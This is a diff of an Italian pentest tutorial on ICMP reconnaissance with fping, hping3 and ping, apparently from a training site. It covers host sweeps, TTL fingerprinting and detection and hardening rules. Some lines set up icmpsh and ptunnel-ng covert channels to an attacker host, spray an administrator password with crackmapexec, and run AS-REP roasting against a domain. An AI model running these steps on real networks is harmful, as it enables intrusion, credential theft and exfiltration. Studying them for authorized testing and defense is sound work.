@@ -1,5 +1,6 @@
 ---
-title: 'Ping, Fping e Hping3: tecniche ICMP e scansioni attive per il recon'
+title: Ping e Tecniche ICMP e Scansioni Attive Per Il Recon
+slug: ping
 description: >-
   Analizza il comportamento della rete con ping, fping e hping3. Tecniche di
   ricognizione ICMP, host discovery e test su firewall usati nei pentest.
@@ -13,162 +14,490 @@ subcategories:
 tags:
   - icmp
   - ping
-slug: "ping"
 ---
 
-### 1. Ping, Fping e Hping3: tecniche ICMP e scansioni attive per il recon
+# Ping e Tecniche ICMP e Scansioni Attive Per Il Recon
 
-**fping** è uno strumento di host discovery progettato per inviare richieste ICMP Echo a **molti target in parallelo**, invece che uno alla volta come `ping`. Lavora in modalità round-robin, risultando estremamente veloce su subnet medio-grandi.
+Durante un internal assessment, hai ottenuto l'accesso iniziale a una workstation in un segmento di rete enterprise. L'ICMP Echo Reply non è filtrato. Questo non è solo un segnale di rete aperta: è l'opportunità per mappare la topologia, fingerprintare i sistemi operativi e stabilire covert channel per il movimento laterale. Questa guida copre l'intero ciclo operativo da reconnaissance a post-compromise.
 
-**A cosa serve per un attaccante**: permette di passare rapidamente da “ho una subnet” a “so quali host sono vivi”, creando la base operativa per l’enumerazione successiva (porte, servizi, ruoli). È uno dei primi tool da usare dopo l’accesso iniziale in rete interna.
+## TL;DR Operativo (Flusso a Step)
 
-**Filosofia del tool**: velocità, semplicità e minimo overhead. fping non sostituisce nmap, ma **riduce lo scope** prima di usarlo.
-
-***
-
-### 2. SETUP E PRIMI PASSI
-
-Installazione su Kali Linux:
-
-sudo apt update && sudo apt install -y fping hping3
-
-Verifica del funzionamento:
-
-fping -v
-
-**Nota operativa**:
-
-* fping e ping funzionano senza privilegi root
-* hping3 richiede root perché costruisce pacchetti raw
+1. **Host Discovery Massivo:** Utilizzo di fping per sweep rapido delle subnet interne, bypassando i limiti del ping tradizionale.
+2. **OS Fingerprinting via TTL:** Analisi del Time-To-Live per identificare sistemi Windows (TTL~~128) vs Linux (TTL~~64) senza banner grabbing.
+3. **Network Path Mapping:** Determinazione del numero di hop e identificazione di firewall intermedi attraverso analisi degli errori ICMP.
+4. **Pre-Exploitation Validation:** Test di connettività verso target specifici prima di lanciare exploit rumorosi.
+5. **Covert Channel Establishment:** Configurazione di tunnel ICMP per command & control o data exfiltration in ambienti filtrati.
+6. **Lateral Movement Preparation:** Mappatura delle trust relationships attraverso l'analisi della connettività di rete.
 
 ***
 
-### 3. TECNICHE OFFENSIVE DETTAGLIATE
+## Fase 1: Ricognizione & Enumeration
 
-#### Ping sweep su una subnet (CIDR)
+**Scenario:** Accesso iniziale a una workstation in una rete enterprise. Devi identificare rapidamente gli host attivi senza generare alert eccessivi.
 
-Situazione: devi scoprire rapidamente quali host sono attivi in una rete di laboratorio.
+**Host Discovery Massivo con fping:**
 
-fping -a -g 10.10.20.0/24
+```bash
+fping -a -g 192.168.1.0/24 2>/dev/null
+```
 
-Spiegazione offensiva:
+**Output Processing per Target List:**
 
-* -g genera tutti gli IP del range
-* -a mostra **solo** gli host che rispondono
-* l’output “is alive” è immediatamente utilizzabile
+```bash
+fping -a -g 192.168.1.0/24 2>/dev/null > live_hosts.txt
+```
 
-Questo comando è il modo più rapido per ridurre una /24 da 254 IP a pochi target reali.
+**TTL Analysis per OS Fingerprinting:**
 
-***
+```bash
+ping -c 1 192.168.1.100 | grep -o 'ttl=[0-9]*'
+```
 
-#### Creare una lista pulita di host vivi
+**TTL Value Interpretation Script:**
 
-Situazione: vuoi passare i target direttamente a nmap.
+```bash
+ping -c 1 192.168.1.100 | awk -F'ttl=' '{print $2}' | awk '{print $1}'
+```
 
-fping -a -g 10.10.20.0/24 > targets\_vivi.txt
+**Hop Count Determination:**
 
-Spiegazione offensiva:
-Questo file diventa input diretto per nmap con -iL. È il flusso operativo standard in Red Team: discovery → lista → enumerazione.
+```bash
+ping -c 1 -t 1 192.168.1.100
+```
 
-***
+**Progressive Hop Testing:**
 
-#### Test singolo host (diagnostica rapida)
+```bash
+for i in {1..30}; do ping -c 1 -t $i 192.168.1.100 2>&1 | grep -q "Time to live exceeded" && echo "Hop $i: TTL exceeded" || break; done
+```
 
-Situazione: vuoi confermare che un host specifico risponda.
+**Combined Nmap Discovery (ARP + ICMP):**
 
-fping -c 3 10.10.20.15
+```bash
+nmap -sn -PR 192.168.1.0/24
+```
 
-Spiegazione offensiva:
+**Hybrid Discovery Approach con Rate Limiting:**
 
-* -c 3 invia 3 echo request
-* utile per verificare stabilità e latenza
-* più rapido e leggibile di ping classico
-
-***
-
-#### Quando ICMP è filtrato: uso di hping3
-
-Situazione: fping non mostra l’host come alive, ma sospetti filtraggio ICMP.
-
-sudo hping3 -S -p 443 -c 1 10.10.20.15
-
-Spiegazione offensiva:
-
-* invia un TCP SYN su porta 443
-* risposta SYN-ACK = host vivo + servizio esposto
-* tecnica chirurgica, meno rumorosa di uno scan completo
+```bash
+nmap -sn --min-hostgroup 64 --min-parallelism 10 192.168.1.0/24
+```
 
 ***
 
-#### Usare stdin / pipeline
+## Fase 2: Initial Exploitation
 
-Situazione: hai una lista grezza di IP proveniente da altri tool.
+**Target Prioritization via TTL Analysis:**
 
-cat lista\_grezza.txt | fping -a -f -
+```bash
+while read ip; do ttl=$(ping -c 1 -W 1 $ip 2>/dev/null | grep -o 'ttl=[0-9]*' | cut -d= -f2); [ "$ttl" -gt 120 ] && echo "$ip: Windows (TTL=$ttl)"; done < live_hosts.txt
+```
 
-Spiegazione offensiva:
+**Pre-Exploit Connectivity Validation:**
 
-* -f legge target da stdin
-* permette di integrare fping in flussi automatizzati
-* perfetto per filtrare host vivi in tempo reale
+```bash
+ping -c 1 -W 2 192.168.1.50 >/dev/null && echo "Target responsive"
+```
 
-***
+**ICMP Filtering Test con Size Variation:**
 
-### 4. SCENARIO DI ATTACCO COMPLETO
+```bash
+ping -c 1 -s 100 192.168.1.100
+```
 
-**Contesto**: accesso iniziale a una workstation interna nella rete 192.168.1.0/24.
+**MTU Path Discovery con DF Bit:**
 
-1. Discovery rapida:
-   fping -a -g 192.168.1.0/24 > live\_hosts.txt
-2. Verifica mirata su server sospetto:
-   fping -c 3 192.168.1.10
-3. Fallback se ICMP è bloccato:
-   sudo hping3 -S -p 80 -c 1 192.168.1.10
-4. Enumerazione avanzata:
-   sudo nmap -sV -sC -iL live\_hosts.txt -oA scan\_reti
+```bash
+ping -c 1 -M do -s 1472 192.168.1.100
+```
 
-**Risultato**: mappa affidabile dei sistemi attivi e dei servizi critici. Da qui parte l’enumerazione SMB, SSH, HTTP, RDP.
+**Automated Exploit Pre-Check Script:**
 
-***
+```bash
+#!/bin/bash
+TARGET=$1
+if ping -c 1 -W 2 $TARGET >/dev/null 2>&1; then
+    echo "[+] $TARGET alive, launching service enumeration..."
+    nmap -p 445,3389,22,21 --open $TARGET
+fi
+```
 
-### 5. CONSIDERAZIONI FINALI PER L’OPERATORE
+**Rate Limited Discovery per Stealth:**
 
-* **Lezione chiave**: fping è il modo più veloce per definire il perimetro reale dell’attacco
-* **Quando usarlo**: sempre prima di nmap in reti interne
-* **Limiti**: ICMP può essere filtrato → serve fallback TCP
-* **Confronto tool**:
-  * fping → discovery massivo
-  * ping → diagnostica singolo host
-  * hping3 → test TCP mirati
+```bash
+fping -a -g 192.168.1.0/24 -r 0 -i 1000 2>/dev/null
+```
 
-***
+**ICMP Fragmentation Testing in Filtered Environments:**
 
-### SEZIONE FORMATIVA HACKITA
-
-**Pronto a Portare le Tue Competenze Offensive al Livello Successivo?**
-La velocità nel muoverti in una rete sconosciuta è ciò che distingue un tester medio da un Red Teamer efficace.
-
-Formazione avanzata e pratica:
-[https://hackita.it/servizi/](https://hackita.it/servizi/)
-
-**Supporta la Comunità della Sicurezza Italiana**
-Il tuo supporto ci permette di mantenere laboratori, guide e formazione offensive di qualità.
-
-[https://hackita.it/supporto/](https://hackita.it/supporto/)
+```bash
+ping -c 1 -s 2000 192.168.1.100
+```
 
 ***
 
-### NOTE LEGALI
+## Fase 3: Post-Compromise & Privilege Escalation
 
-Le tecniche descritte devono essere utilizzate **esclusivamente** in ambienti autorizzati (lab, CTF, penetration test con permesso scritto).
+**Internal Network Enumeration da Host Compromesso:**
 
-**Formati. Sperimenta. Previeni.**
-Hackita – Excellence in Offensive Security
+```bash
+ping -c 1 192.168.1.1
+```
+
+**Sequential Internal Host Discovery:**
+
+```bash
+for i in {1..254}; do ping -c 1 -W 50 192.168.1.$i | grep -q "ttl" && echo "192.168.1.$i alive"; done
+```
+
+**Management Network Connectivity Test:**
+
+```bash
+ping -c 1 10.10.10.1
+```
+
+**Server Network Connectivity Test:**
+
+```bash
+ping -c 1 172.16.0.1
+```
+
+**ICMP Tunnel Setup con ptunnel-ng:**
+
+```bash
+sudo ptunnel-ng -c 192.168.1.100 -p 192.168.1.1 -l 2222 -r 22
+```
+
+**ICMP Backdoor Detection:**
+
+```bash
+tcpdump -n 'icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply' -c 10
+```
+
+**Privilege Escalation Path Discovery:**
+
+```bash
+ping -c 1 -W 1 192.168.2.1 2>/dev/null && echo "Segment 192.168.2.0/24 reachable"
+```
+
+**TTL Deception Detection:**
+
+```bash
+tcpdump -n 'icmp and ip[8] < 30' -c 5
+```
 
 ***
 
-### RIFERIMENTI ESTERNI
+## Fase 4: Lateral Movement & Pivoting
 
-RFC 792 – ICMP: [https://www.rfc-editor.org/rfc/rfc792](https://www.rfc-editor.org/rfc/rfc792)
-IANA ICMP Parameters: [https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml](https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml)
-Documentazione fping: [https://fping.org/](https://fping.org/)
+**External Path Analysis:**
+
+```bash
+traceroute -n 8.8.8.8
+```
+
+**Internal Subnet Path Analysis:**
+
+```bash
+traceroute -n 192.168.2.1
+```
+
+**Pivot Host Connectivity Test:**
+
+```bash
+ssh user@compromised-host "ping -c 1 10.10.10.1"
+```
+
+**ICMP Covert Channel con icmpsh:**
+
+```bash
+./icmpsh_m.py 192.168.1.100 192.168.1.50
+```
+
+**Traffic Obfuscation con Legitimate Ping Flood:**
+
+```bash
+ping -f -c 1000 192.168.1.1
+```
+
+**Multi-Segment Discovery da Pivot:**
+
+```bash
+ssh user@192.168.1.100 "fping -a -g 10.10.10.0/24 2>/dev/null"
+```
+
+**VLAN Hopping Consideration Test:**
+
+```bash
+ping -c 1 -b 192.168.1.255
+```
+
+***
+
+## Attack Chain Reale: Da ICMP Sweep a Domain Pivot
+
+**Scenario:** Compromissione di una workstation in un ambiente enterprise con 500+ host. L'obiettivo è identificare e compromettere i domain controller.
+
+**Step 1 - Initial Sweep:**
+
+```bash
+fping -a -g 192.168.1.0/23 2>/dev/null | head -20 > initial_targets.txt
+```
+
+**Step 2 - OS Fingerprinting:**
+
+```bash
+for ip in $(cat initial_targets.txt); do ttl=$(ping -c 1 -W 1 $ip 2>/dev/null | grep -o 'ttl=[0-9]*' | cut -d= -f2); [ "$ttl" -gt 120 ] && echo "$ip: Windows" >> windows_hosts.txt; done
+```
+
+**Step 3 - Service Enumeration:**
+
+```bash
+nmap -p 445,3389 -iL windows_hosts.txt --open -oG smb_scan.gnmap
+```
+
+**Step 4 - Credential Testing:**
+
+```bash
+crackmapexec smb windows_hosts.txt -u 'Administrator' -p 'Password123' --continue-on-success
+```
+
+**Step 5 - Network Path Discovery:**
+
+```bash
+for ip in $(cat compromised_hosts.txt); do traceroute -n $ip | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" | tail -1 | awk '{print $2}' >> internal_gateways.txt; done
+```
+
+**Step 6 - Pivot to Server Segment:**
+
+```bash
+ssh administrator@compromised_host "ping -c 1 10.10.10.1"
+```
+
+**Step 7 - Domain Controller Targeting:**
+
+```bash
+nmap -p 88,389,636 -iL server_segment.txt --open
+```
+
+**Step 8 - Kerberos Attacks:**
+
+```bash
+GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -output hashes.txt
+```
+
+***
+
+## ICMP Tunneling: Technical Implementation and Limitations
+
+**Quando Utilizzare Realisticamente ICMP Tunneling:**
+
+* Ambienti con filtering aggressivo su tutte le porte TCP/UDP ma ICMP permesso
+* Reti di air-gapped systems con controlli perimetrali stringenti
+* Scenario di data exfiltration per piccoli dataset critici (\< 1MB)
+* Situazioni dove il rischio di detection è accettabile rispetto al beneficio
+
+**Limiti Tecnici Realistici:**
+
+```bash
+# MTU Limitations - massimo payload pratico
+ping -c 1 -s 500 192.168.1.100
+```
+
+```bash
+# IDS Detection Test per payload anomali
+tcpdump -i eth0 'icmp and (ip[2:2] > 84)'
+```
+
+**ptunnel vs icmpsh - Technical Comparison:**
+
+```bash
+# ptunnel - TCP over ICMP (più stabile per tunnel lunghi)
+sudo ptunnel-ng -c server_ip -p proxy_ip -l 1080 -r 22
+```
+
+```bash
+# icmpsh - Interactive shell (più agile per sessioni brevi)
+./icmpsh_m.py attacker_ip victim_ip
+```
+
+**Detection Signatures in Enterprise Environments:**
+
+```bash
+# Suricata Rule per ICMP Tunnel Detection
+alert icmp any any -> any any (msg:"Suspicious ICMP Size"; dsize:>200; itype:8; sid:1000001;)
+```
+
+```bash
+# Zeek Script per ICMP Anomaly Detection
+event icmp_sent(c: connection, icmp: icmp_info)
+{
+    if (icmp$len > 200) {
+        NOTICE([$note=ICMP::Large_Packet,
+                $conn=c,
+                $msg=fmt("Large ICMP packet from %s", c$id$orig_h)]);
+    }
+}
+```
+
+**Perché ICMP Tunneling Non È Stealth Come Si Pensa:**
+
+* Enterprise IDS/IPS hanno signature dedicate per payload ICMP anomali
+* NetFlow e analisi comportamentale rilevano pattern di traffico ICMP inconsueti
+* I pacchetti con size atipici (> 150 bytes) sono immediatamente sospetti
+* La consistenza nel timing dei pacchetti ICMP è facilmente profilabile
+
+***
+
+## Fase 5: Detection & Hardening Enterprise
+
+**ICMP Sweep Detection Rule:**
+
+```bash
+# Snort/Suricata Rule per ICMP sweep
+alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"ICMP Sweep Detected"; dsize:0; itype:8; threshold: type threshold, track by_src, count 50, seconds 10; sid:1000002;)
+```
+
+**TTL Anomaly Detection:**
+
+```bash
+# Alert su TTL values inconsistenti
+alert icmp any any -> any any (msg:"TTL Anomaly Detected"; ttl:<30; sid:1000003;)
+```
+
+**ICMP Tunnel Signature:**
+
+```bash
+# Detect ICMP packets con data payload
+alert icmp any any -> any any (msg:"ICMP Tunnel Potential"; dsize:>100; content:"|00 00 00 00|"; depth:4; sid:1000004;)
+```
+
+**Enterprise Rate Limiting Configuration:**
+
+```bash
+# Linux iptables rate limiting
+iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/second --limit-burst 3 -j ACCEPT
+```
+
+```bash
+# Cisco IOS Rate Limiting
+access-list 101 permit icmp any any echo
+rate-limit input access-group 101 8000 8000 8000 conform-action transmit exceed-action drop
+```
+
+**Strategic ICMP Filtering:**
+
+```bash
+# Allow ICMP solo da management networks
+iptables -A INPUT -p icmp -s 10.10.10.0/24 -j ACCEPT
+```
+
+```bash
+# Drop all other ICMP
+iptables -A INPUT -p icmp -j DROP
+```
+
+**Comprehensive ICMP Logging:**
+
+```bash
+# Log all ICMP packets
+iptables -A INPUT -p icmp -j LOG --log-prefix "ICMP Packet: " --log-level 4
+```
+
+**Windows ICMP Hardening via Registry:**
+
+```cmd
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d 0 /f
+```
+
+```cmd
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDeadGWDetect" /t REG_DWORD /d 0 /f
+```
+
+**Network Device Hardening:**
+
+```bash
+# Cisco ASA ICMP Inspection
+icmp permit any echo-reply outside
+icmp permit any echo outside
+icmp permit any time-exceeded outside
+icmp permit any unreachable outside
+```
+
+***
+
+## Errori Comuni Che Vedo Negli Assessment Reali
+
+1. **ICMP completamente bloccato su tutti i segmenti:** Disabilitazione totale che rompe il path MTU discovery e strumenti di troubleshooting legittimi.
+2. **Mancato rate limiting su edge firewall:** Permettere ICMP flood senza limitazioni, rendendo possibile DoS basic o mascheramento di attività.
+3. **TTL anomalies ignorate nei log SIEM:** Sistemi SIEM che non correlano variazioni anomale del TTL con potenziali attività di spoofing o tunneling.
+4. **ICMP aperto tra VLAN diverse senza necessità:** Configurazioni che permettono ICMP tra VLAN di utenti e server, esponendo informazioni di rete.
+5. **Ping consentito da segmenti utente verso domain controller:** Policy di rete che facilitano l'identificazione di target critici attraverso semplici ping sweep.
+6. **Logging ICMP disabilitato per performance:** Eliminazione della capacità di rilevare host discovery iniziale e pattern di scanning.
+7. **Mancanza di baseline per traffico ICMP normale:** Impossibilità di identificare anomalie sofisticate senza una baseline di riferimento.
+8. **Inconsistent ICMP policies across network devices:** Firewall diversi con policy diverse che creano inconsistency rilevabili.
+
+***
+
+## Playbook Operativo 80/20: ICMP in Internal Assessment
+
+| Obiettivo                    | Azione Concreta                                 | Strumento Primario              | Metrica di Successo                 |
+| ---------------------------- | ----------------------------------------------- | ------------------------------- | ----------------------------------- |
+| Host discovery massivo       | Sweep di subnet interne con rate limiting       | fping                           | 95% degli host attivi identificati  |
+| OS fingerprinting rapido     | Analisi TTL delle risposte ICMP                 | ping + awk                      | Corretta classificazione OS >85%    |
+| Network path mapping         | Determinazione hop count verso target critici   | traceroute                      | Identificazione di tutti i hop      |
+| Pre-exploitation validation  | Test di connettività prima di lanciare exploit  | ping con timeout personalizzato | Zero falsi negativi                 |
+| Covert channel detection     | Monitoraggio di payload ICMP anomali            | tcpdump con filtri avanzati     | Rilevamento di tunnel attivi        |
+| Lateral movement preparation | Mappatura della connettività tra segmenti       | ping da host compromessi        | Identificazione trust relationships |
+| Detection evasion            | Rate limiting e variazione dei pattern di probe | Scripting customizzato          | Scanning non rilevato da IDS        |
+
+***
+
+## Lab Multi-Step: Internal Network Enumeration to AD Compromise
+
+**Scenario "Enterprise ICMP Kill Chain":** Ambiente di lab che replica una rete enterprise con Active Directory complesso, multi-segmento e sistemi legacy.
+
+**Kill Chain Completa:**
+
+1. **Initial Access:** Compromissione di workstation via phishing simulato con payload basic.
+2. **Network Discovery:** Utilizzo di tecniche ICMP per mappare gli host attivi senza triggerare alert.
+3. **Target Prioritization:** Fingerprinting OS via TTL per identificare server Windows e domain controller.
+4. **Service Enumeration:** Scansione mirata dei servizi sui target identificati come Windows.
+5. **Credential Compromise:** Sfruttamento di password reuse tra workstation e server.
+6. **Lateral Movement:** Pivot verso segmenti server utilizzando credenziali compromesse.
+7. **Domain Privilege Escalation:** Attacchi Kerberos verso domain controller identificati.
+8. **Persistence & Exfiltration:** Setup di covert channel ICMP per data exfiltration persistente.
+
+**Technical Learning Objectives:**
+
+* Host discovery massivo con evasion techniques
+* OS fingerprinting accurato attraverso analisi TTL
+* Configurazione e detection di ICMP tunneling
+* Integrazione di ICMP reconnaissance nella kill chain AD
+* Techniques per evitare il rilevamento durante la fase discovery
+
+## **CTA Tecnica e Concreta:** Questo scenario completo, con infrastruttura realistica e debrief tecnico dettagliato, è parte del percorso **"Advanced Internal Network Assessment"** di HackITA. Impara a collegare tecniche di host discovery con attacchi avanzati ad Active Directory in ambienti controllati.
+
+## 🔗 Link Interni HackITA (Correlati alla Kill Chain ICMP → AD)
+
+* [https://hackita.it/articoli/nmap](https://hackita.it/articoli/nmap)
+  → Approfondimento su host discovery avanzato, tecniche ARP/ICMP e ottimizzazione scansioni in ambienti interni.
+* [https://hackita.it/articoli/kerberos-attacks](https://hackita.it/articoli/kerberos-attacks)
+  → Collegamento diretto alla fase Domain Compromise descritta nell’articolo (AS-REP Roasting, Kerberoasting, ecc.).
+* [https://hackita.it/servizi](https://hackita.it/servizi)
+  → Per test reali su infrastrutture enterprise, simulazioni Red Team e validazione segmentazione ICMP/VLAN.
+
+***
+
+## 🌍 Link Esterni Tecnici di Riferimento
+
+* [https://attack.mitre.org/techniques/T1046/](https://attack.mitre.org/techniques/T1046/)
+  → MITRE ATT\&CK – Network Service Discovery. Inquadra ICMP sweep e host discovery nel framework ufficiale.
+* [https://nmap.org/book/man-host-discovery.html](https://nmap.org/book/man-host-discovery.html)
+  → Documentazione ufficiale Nmap su host discovery (ICMP, ARP, TCP ping) per confronto tecnico con fping.
+* [https://www.rfc-editor.org/rfc/rfc792](https://www.rfc-editor.org/rfc/rfc792)
+  → RFC ufficiale ICMP. Base tecnica per comprendere TTL, Type/Code e limiti strutturali del protocollo.
+
+***
+
+*Questa guida è per scopi formativi in ambienti controllati e autorizzati. Ogni test su sistemi di terze parti richiede autorizzazione scritta esplicita.*
